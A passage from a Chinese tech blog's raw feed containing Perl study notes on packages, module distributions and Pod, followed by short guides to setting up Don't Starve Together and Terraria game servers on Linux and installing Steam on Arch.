class="hljs-title">turn_toward_heading</span> </span>&#123;<br>    ...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">turn_toward_port</span> </span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>实际上是在这个模块中, 给大多数 (变量) 名称之前插入 <code>Navigation::</code> 前缀. 这样用 <code>require</code> 导入就可以避免命名冲突.</p><p>包名应当以一个大写字母开头.</p><p>包名也可以为由双冒号分割的多个名称, 如 <code>Minnow::Navigation</code>.</p><h2 id="11-7-Package-指令的作用域"><a href="#11-7-Package-指令的作用域" class="headerlink" title="11.7 Package 指令的作用域"></a>11.7 Package 指令的作用域</h2><p>所有 Perl 文件运行时就好象我们有一个 main 包定义在起始部分. 直到声明下一条包指令之前, 当前所有包指令仍然有效, 除非包指令在一个带大括号的作用域中. 在那种情况下, Perl 解释器会记住之前的包指令, 当带大括号的作用域结束时, 就还原之前的包指令:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Navigation;<br><br>&#123;<br>    <span class="hljs-keyword">package</span> main;<br><br>    <span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">turn_toward_heading</span> </span>&#123; <span class="hljs-comment"># main::turn_toward_heading</span><br>        ...<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">turn_toward_port</span> </span>&#123; <span class="hljs-comment"># Navigation::turn_toward_port</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>大多数库在文件的起始部分仅有一个包声明, 大多数程序把 <code>main</code> 包作为默认的包名.</p><p>不管当前包的定义如何, 一些名称总在 <code>main</code> 包中. (具体见书)</p><h2 id="11-8-包和专门词汇"><a href="#11-8-包和专门词汇" class="headerlink" title="11.8 包和专门词汇"></a>11.8 包和专门词汇</h2><p>通过 <code>my</code> 关键词引入的变量不使用当前包作为前缀, 因为包变量总是全局变量 (词法变量对于程序的一部分而言通常是临时的并且可访问的)</p><p><code>our</code> 关键词表明一个 package 中的变量前面可以不用加 package 名.</p><p>具体看:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc -f our<br></code></pre></td></tr></table></figure><h3 id="包语句块"><a href="#包语句块" class="headerlink" title="包语句块"></a>包语句块</h3><p>可以使用语句块的语法:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Navigation &#123;<br>    <span class="hljs-keyword">my</span> @homeport = ...<br><br>    ...<br>&#125;<br><br><span class="hljs-keyword">package</span> DropAnchor &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>新的包语法允许指定一个版本:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">12</span>;<br><br><span class="hljs-keyword">package</span> Navigation <span class="hljs-number">0</span>.<span class="hljs-number">01</span>;<br><br><span class="hljs-keyword">package</span> DropAnchor <span class="hljs-number">1.23</span> &#123; ... &#125;;<br></code></pre></td></tr></table></figure><h1 id="第12章-创建你自己的发行版"><a href="#第12章-创建你自己的发行版" class="headerlink" title="第12章 创建你自己的发行版"></a>第12章 创建你自己的发行版</h1><h2 id="12-1-Perl-模块的两个构建系统"><a href="#12-1-Perl-模块的两个构建系统" class="headerlink" title="12.1 Perl 模块的两个构建系统"></a>12.1 Perl 模块的两个构建系统</h2><p>Perl 有两种常见的发行版构建系统:</p><ul><li>ExtUtils::Makemaker, 基于 make 构建, 使用一个叫做 Makefile.PL 的文件来控制构建过程</li><li>Module::Build, 使用 Build.PL 文件</li></ul><h3 id="12-1-1-在-Makefile-PL-内部"><a href="#12-1-1-在-Makefile-PL-内部" class="headerlink" title="12.1.1 在 Makefile.PL 内部"></a>12.1.1 在 Makefile.PL 内部</h3><p>可在 ExtUtils::Makemaker 模块的文档中了解配置细节.</p><p><code>PREREQ_PM</code> 键的值，列吃了在运行代码时需要的以来模块及其版本号, 当在这里列出以来的模块时，CPAN 客户端都能够自动获取，构建并且安装它们.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">...<br><span class="hljs-string">PREREQ_PM =&gt;</span> &#123;<br>    <span class="hljs-string">&#x27;Test::More&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>&#125;,<br>...<br></code></pre></td></tr></table></figure><p>指定模块的版本:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> ExtUtils::Makemaker <span class="hljs-number">6.65</span>;<br></code></pre></td></tr></table></figure><p>另一个有用的设置 <code>EXE_FILES</code> 键, 在它对应的值里面列出发行版中包含的可安装程序:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> ExtUtils::Makemaker <span class="hljs-number">6.65</span>;<br><br>WriteMakefile(<br>    ...<br>    <span class="hljs-string">EXE_FILES =&gt;</span> [ <span class="hljs-string">qw( scripts/barnyard.pl )</span> ],<br>    ...<br><br>);<br>    <br></code></pre></td></tr></table></figure><h3 id="12-1-2-在-Build-PL-文件内部"><a href="#12-1-2-在-Build-PL-文件内部" class="headerlink" title="12.1.2 在 Build.PL 文件内部"></a>12.1.2 在 Build.PL 文件内部</h3><p>Module::Build::API 的文档解释了有效键的所有信息.</p><h2 id="12-2-我们的第一个发行版"><a href="#12-2-我们的第一个发行版" class="headerlink" title="12.2 我们的第一个发行版"></a>12.2 我们的第一个发行版</h2><h3 id="12-2-1-h2xs-工具"><a href="#12-2-1-h2xs-工具" class="headerlink" title="12.2.1 h2xs 工具"></a>12.2.1 h2xs 工具</h3><p>h2xs 用来将 C 语言的 <code>.h</code> 头文件转换成 <code>.xs</code> 文件，作为连接 C 和 Perl 的胶水语言.</p><p>使用 <code>-A</code> 和 <code>-X</code> 参数来关闭 <code>AUTOLOAD</code> 和 <code>XS</code> 特性. 使用 <code>-n</code> 开关设置模块名称:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ h2xs -AX -n Animal<br></code></pre></td></tr></table></figure><p>这将创建一系列文件.</p><h3 id="12-2-2-Module-Starter-模块"><a href="#12-2-2-Module-Starter-模块" class="headerlink" title="12.2.2 Module::Starter 模块"></a>12.2.2 Module::Starter 模块</h3><p>更加通用的做法是使用 Module::Starter 模块, 该模块并不包含在标准库中.</p><p>通过 module-starter 程序，可以设定我们的姓名和电子邮箱，这些信息将被插入相关文件合适的地方.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ module-starter --module=Animal --author=<span class="hljs-string">&quot;Gilligan&quot;</span> /<br>--email=gilligan@island.example.com --verbose<br></code></pre></td></tr></table></figure><p>默认情况下， module-starter 程序会创建一个带 Makefile.PL 的安装目录系统发行版. </p><p>如果享用 Module::Build 模块替代，使用 <code>--builder</code> 参数:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ module-starter --builder=<span class="hljs-string">&quot;Module::Build&quot;</span> --module=Animal --author=<span class="hljs-string">&quot;Gilligan&quot;</span> /<br>--email=gilligan@island.example.com --verbose<br></code></pre></td></tr></table></figure><p>module-starter 的配置文件位于 <code>$HOME/.module-starter/config</code>, 也可以设置 <code>MODULE_STARTER_DIR</code> 环境变量来指定包含 config 的目录名称.</p><p>在配置文件内部，可以列出用冒号分割的所有参数名称和值:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">author:</span> Willie Gilligan<br><span class="hljs-symbol">emain:</span> gilligan@island.example.com<br><span class="hljs-symbol">builder:</span> Module::Build<br><span class="hljs-symbol">verbose:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>之后只需要运行:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ module-starter --module=Animal<br></code></pre></td></tr></table></figure><p>就可以达到同样的效果.</p><h3 id="12-2-3-定制模板"><a href="#12-2-3-定制模板" class="headerlink" title="12.2.3 定制模板"></a>12.2.3 定制模板</h3><p>Module::Starter::Plugin 模块的文档展示了如何创建自己的插件.</p><p>对于真正复杂的模块创建，可以使用 Dist::Zilla 模块.</p><h2 id="12-3-在你的发行版内部"><a href="#12-3-在你的发行版内部" class="headerlink" title="12.3 在你的发行版内部"></a>12.3 在你的发行版内部</h2><p>运行构建脚本:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Build.PL<br></code></pre></td></tr></table></figure><p><code>Build.PL</code> 会检查发行版，确保它所需要的所有文件是完整的，每个发行版将在 <code>MANIFEST</code> 文件记录检查的结果.</p><p>一旦 <code>Build.PL</code> 文件完成了检查，它将创建一个程序，其中包含 Perl 的设置，模块的路径和其他一些信息.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./Build<br></code></pre></td></tr></table></figure><p>其:</p><ol><li>从 lib 目录将模块文件复制到构建库 blib 目录中 , 这是构建系统用来保存所有准备安装文件的位置</li><li>Module::Build 模块将 Animal 模块内置的文档装换成 UNIX 系统中类似的手册页 (manpage), 然后放置到 <code>blib/libdoc</code> 目录中.</li></ol><p>测试命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./Build <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>测试的脚本由之前 <code>module-starter</code> 命令创建于 <code>t</code> 目录中.</p><p>另一个测试参数 <code>disttest</code>, 用于发布发行版之前. 用来检查我们即将放入压缩包和发布的内容已经包含测试所需的所有信息:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./Build disttest<br></code></pre></td></tr></table></figure><p>过程: Build 会为它即将创建的压缩包文件创建一个子目录，将 MANIFEST 中列出的所有文件复制进去，切换到子目录的位置，然后再次执行测试.</p><p>真正准备好发布发行版时，执行 <code>dist</code> 参数，MAINIFFEST 文件中列出的所有文件都将被重新组织.</p><h3 id="12-3-1-META-文件"><a href="#12-3-1-META-文件" class="headerlink" title="12.3.1 META 文件"></a>12.3.1 META 文件</h3><p>客户端可以根据 <code>META.json</code> 和 <code>META.yml</code> 文件的信息判断它需要做什么事情.</p><p><code>_require</code> 字段列出安装环境需要满足的条件.</p><h3 id="12-3-2-添加额外的模块"><a href="#12-3-2-添加额外的模块" class="headerlink" title="12.3.2 添加额外的模块"></a>12.3.2 添加额外的模块</h3><p>一开始酒吧多个模块文件放入一个发行版中:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ module-starter --module=Animal,Cow,Horse,Mouse<br></code></pre></td></tr></table></figure><p>在创建发行版之后，还想往发行版中添加新的模块文件，使用 Module::Starter::AddModule 模块, 但这个模块需要安装好, 可以将 <code>module-starter</code> 的配置文件写为:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">author:</span> Willie Gilligan<br><span class="hljs-symbol">emain:</span> gilligan@island.example.com<br><span class="hljs-symbol">builder:</span> Module::Build<br><span class="hljs-symbol">verbose:</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">plugins:</span> Module::Starter::AddModule<br></code></pre></td></tr></table></figure><p>用 <code>module-starter</code> 添加时需要用 <code>--dist</code> 参数指定添加到哪一个发行版，用 <code>--module</code> 参数指定要添加的模块:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ module-starter --module=Sheep --dist=Animal<br></code></pre></td></tr></table></figure><p>添加的模块也是一个新的模块，而不是 cpan 上已有的模块.</p><h2 id="12-4-模块内部"><a href="#12-4-模块内部" class="headerlink" title="12.4 模块内部"></a>12.4 模块内部</h2><p>Perl 有一个嵌入式的文档称为 Pod, 它是 Plain ol’Documentation 的简称. 可以在代码部分之间放置 Pod, 就是一些代码接着一些文档，再接着一些代码的格式.</p><p>可在 <code>perlpod</code> 和 <code>perlpodspec</code> 两个文档中参考 Pod 的文本格式规范.</p><h2 id="12-5-老式文档"><a href="#12-5-老式文档" class="headerlink" title="12.5 老式文档"></a>12.5 老式文档</h2><p>Perl 解析器会忽略文档部分.</p><p><code>perldoc</code> 程序会忽略代码部分.</p><p>可以直接用 <code>perldoc</code> 来阅读 Pod 文档部分:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc lib/Animal.pm<br></code></pre></td></tr></table></figure><p>默认情况下，<code>perldoc</code> 借助 <code>nroff</code> 命令.</p><p>可以用 <code>pod2html</code> 程序将 Pod 转换成 HTML 格式:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pod2html lib/Animal.pm<br></code></pre></td></tr></table></figure><h3 id="12-5-1-段落的-Pod-命令"><a href="#12-5-1-段落的-Pod-命令" class="headerlink" title="12.5.1 段落的 Pod 命令"></a>12.5.1 段落的 Pod 命令</h3><p><code>=headn</code> 指定一个标题.</p><p><code>=head1</code> 是一级标题.</p><p><code>=head2</code> 是二级标题.</p><p>需要返回代码模式时，就以 <code>=cut</code> 语句结束.</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs excel">=head1 NAME<br><br>=head1 DESCRIPTION<br><br>=head2 Functions<br><br>=cut<br></code></pre></td></tr></table></figure><p>可以用 <code>=over n</code> 来创建列表, 列表的每个元素用 <code>=item</code> 来标记.</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">=over <span class="hljs-number">4</span><br><br>=item <span class="hljs-number">1</span>. Gilligan<br><br>=item <span class="hljs-number">2</span>. Skipper<br><br>=item <span class="hljs-number">3</span>. Ginger<br><br>=back<br></code></pre></td></tr></table></figure><p>使用 <code>*</code> 就会显示 <code>*</code>:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">=over <span class="hljs-number">4</span><br><br>=item * Gilligan<br><br>=item * Skipper<br><br>=item * Ginger<br><br>=back<br></code></pre></td></tr></table></figure><h3 id="12-5-2-Pod-段落"><a href="#12-5-2-Pod-段落" class="headerlink" title="12.5.2 Pod 段落"></a>12.5.2 Pod 段落</h3><p>在文档中加入文本:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">=head1 SYNOPSIS  <br><br>Quick summary of what the module does.<br><br>Perhaps a little <span class="hljs-built_in">code</span> snippet.<br><br>    use Animal;<br><br>    my $foo = Animal-&gt;new();<br></code></pre></td></tr></table></figure><h3 id="12-5-3-Pod-格式标记"><a href="#12-5-3-Pod-格式标记" class="headerlink" title="12.5.3 Pod 格式标记"></a>12.5.3 Pod 格式标记</h3><p><img src="/../img/Pod_mark.png"></p><p>处理 UTF-8:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">=encoding utf8<br><br>Gilligan ...<br></code></pre></td></tr></table></figure><h3 id="12-5-4-检查-Pod-格式"><a href="#12-5-4-检查-Pod-格式" class="headerlink" title="12.5.4 检查 Pod 格式"></a>12.5.4 检查 Pod 格式</h3><p>可以用 <code>podchecker</code> 来检查 Pod 文档的语法是否正确:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ podchecker lib/Animal.pm<br></code></pre></td></tr></table></figure><h2 id="12-6-模块中的代码"><a href="#12-6-模块中的代码" class="headerlink" title="12.6 模块中的代码"></a>12.6 模块中的代码</h2><p>按照惯例，Perl 模块使用包变量 <code>$VERSION</code> 来声明版本号.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">our</span> $VERSION = <span class="hljs-string">&#x27;0.01&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="12-7-模块构建的总结"><a href="#12-7-模块构建的总结" class="headerlink" title="12.7 模块构建的总结"></a>12.7 模块构建的总结</h2><p>见书.</p><h1 id="第13章-对象简介"><a href="#第13章-对象简介" class="headerlink" title="第13章 对象简介"></a>第13章 对象简介</h1><p>仅在程序的长度超过 N 行后 OOP (Object Oriented Programming) 的益处才能会显露出来.</p><p>可查阅 《Object Oriented Perl》一书.</p><p>Perl 的对象架构是在包，子例程和引用的概念上建立的.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>搭建饥荒服务器</title>
    <link href="/2022/10/19/%E6%90%AD%E5%BB%BA%E9%A5%A5%E8%8D%92%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2022/10/19/%E6%90%AD%E5%BB%BA%E9%A5%A5%E8%8D%92%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><a href="https://www.psychz.net/client/kb/en/how-to-setup-a-dedicated-server-for-dont-starve-together-dst.html">参考</a></h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt update<br>$ apt install screen wget<br></code></pre></td></tr></table></figure><p>添加 32 位 linraries. 使用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">arch</span><br></code></pre></td></tr></table></figure><p>来查询.</p><p>若输出为 <code>X86_64</code>, 则需要添加.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ dpkg --add-architecture i386<br>$ apt update <br>$ apt install lib32gcc1<br></code></pre></td></tr></table></figure><p>报错提示没有 <code>lib32gcc1</code>, 让我下载 <code>lib32gcc-s1</code></p><h2 id="下载-Steam-命令行工具并运行更新"><a href="#下载-Steam-命令行工具并运行更新" class="headerlink" title="下载 Steam 命令行工具并运行更新"></a>下载 Steam 命令行工具并运行更新</h2><p>新建目录:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> steamcmd<br>$ <span class="hljs-built_in">cd</span> steamcmd<br>$ wget http://steamcdn-a.akamaihd.net/client/installer/steamcmd_linux.tar.gz<br></code></pre></td></tr></table></figure><p>解压缩:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar -xvzf steamcmd_linux.tar.gz<br></code></pre></td></tr></table></figure><p>更新 steam tool:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./steamcmd.sh<br></code></pre></td></tr></table></figure><p>看见:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">Steam&gt;</span><br></code></pre></td></tr></table></figure><p>则进入了 Steam command line.</p><p>用你的用户名和密码登录 steam. 没有账户可以用 <code>anonymous</code>:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Steam&gt; <span class="hljs-keyword">login</span> anonymous <br></code></pre></td></tr></table></figure><h2 id="安装饥荒"><a href="#安装饥荒" class="headerlink" title="安装饥荒"></a>安装饥荒</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Steam&gt; force_install_dir <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/Documents/</span>DST<br>Steam&gt; app_update <span class="hljs-number">343050</span> validate<br></code></pre></td></tr></table></figure><p>Don’t Starve Together 的 Steam ID.</p><h2 id="运行服务器"><a href="#运行服务器" class="headerlink" title="运行服务器"></a>运行服务器</h2><p>进入到安装 DST 的目录下的 bin 目录, 先新建 screen, 然后运行:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -S <span class="hljs-string">&quot;DST uestc&quot;</span><br>$ ./dontstarve_dedicated_server_nullrenderer -console<br></code></pre></td></tr></table></figure><h1 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a><a href="https://forums.kleientertainment.com/forums/topic/64441-dedicated-server-quick-setup-guide-linux/">参考</a></h1><h1 id="参考-nodecraft-官方教程"><a href="#参考-nodecraft-官方教程" class="headerlink" title="参考 nodecraft 官方教程"></a><a href="https://nodecraft.com/support/games/dont-starve-together/how-to-acquire-a-cluster-token">参考 nodecraft 官方教程</a></h1><h1 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a><a href="https://zhuanlan.zhihu.com/p/25831490">参考</a></h1><h1 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a><a href="https://cloud.tencent.com/developer/article/1185065">参考</a></h1><h1 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a><a href="https://www.bilibili.com/video/BV1BJ411C7xK/?vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考</a></h1>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>搭建-Terraria-Server-For-Linux</title>
    <link href="/2022/10/19/%E6%90%AD%E5%BB%BA-Terraria-Server-For-Linux/"/>
    <url>/2022/10/19/%E6%90%AD%E5%BB%BA-Terraria-Server-For-Linux/</url>
    
    <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><a href="https://www.shells.com/l/en-US/tutorial/How-to-set-up-a-Terraria-Server-For-Ubuntu-Linux">参考</a></h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>安装一些软件:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt update <br>$ apt install unzip<br></code></pre></td></tr></table></figure><p>新建目录:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/Documents/terraria<br>$ <span class="hljs-built_in">cd</span> terraria<br></code></pre></td></tr></table></figure><h2 id="获取服务器安装包"><a href="#获取服务器安装包" class="headerlink" title="获取服务器安装包"></a>获取服务器安装包</h2><p>在 <a href="https://terraria.fandom.com/wiki/Server#Downloads">官网</a> 可以查看相关包的链接.</p><p>在新建的目录下使用 wget 下载:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget https://terraria.org/api/download/pc-dedicated-server/terraria-server-1445.zip<br></code></pre></td></tr></table></figure><h2 id="解压缩并安装"><a href="#解压缩并安装" class="headerlink" title="解压缩并安装"></a>解压缩并安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ unzip terraria-server-1445.zip<br></code></pre></td></tr></table></figure><p>进入目录:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cd</span> 1445<br>$ <span class="hljs-built_in">cd</span> Linux<br></code></pre></td></tr></table></figure><p>添加权限:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo <span class="hljs-built_in">chmod</span> +x TerrariaServer.bin.x86*<br></code></pre></td></tr></table></figure><p>运行:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./TerrariaServer.bin.x86_64<br></code></pre></td></tr></table></figure><p>生成的世界位于 <code>~/.local/share/Terraria/Worlds/</code> 目录下.</p><h1 id="参考-B-站"><a href="#参考-B-站" class="headerlink" title="参考 B 站"></a><a href="https://www.bilibili.com/video/BV1vk4y167Ci/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站</a></h1>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在-ArchLinux-上安装-Steam</title>
    <link href="/2022/10/19/%E5%9C%A8-ArchLinux-%E4%B8%8A%E5%AE%89%E8%A3%85-Steam/"/>
    <url>/2022/10/19/%E5%9C%A8-ArchLinux-%E4%B8%8A%E5%AE%89%E8%A3%85-Steam/</url>
    
    <content type="html"><![CDATA[<p>直接通过 <code>pacman</code> 即可下载:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S steam<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GNU-stow-的使用</title>
    <link href="/2022/10/19/GNU-stow-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/19/GNU-stow-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用-rcm-管理配置文件</title>
    <link href="/2022/10/19/%E4%BD%BF%E7%94%A8-rcm-%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    <url>/2022/10/19/%E4%BD%BF%E7%94%A8-rcm-%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
    
